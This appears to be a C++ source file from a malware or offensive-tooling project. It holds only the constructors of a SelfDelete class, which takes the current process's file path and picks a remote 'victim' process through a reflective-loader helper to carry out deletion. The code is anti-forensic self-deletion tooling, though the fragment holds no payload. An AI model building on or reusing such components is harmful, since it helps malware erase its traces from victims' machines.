#include "SelfDelete.hpp"

SelfDelete::SelfDelete(const Pid remote_pid, const ProcessAccess access_rights) :
	m_deletor_process(std::make_unique<Process>(remote_pid, access_rights)),
	m_file_path(process_utils::get_current_process_filename())
{
}

SelfDelete::SelfDelete() :
	m_deletor_process(reflective_loader_utils::find_victim_process()),
	m_file_path(process_utils::get_current_process_filename())
{
}
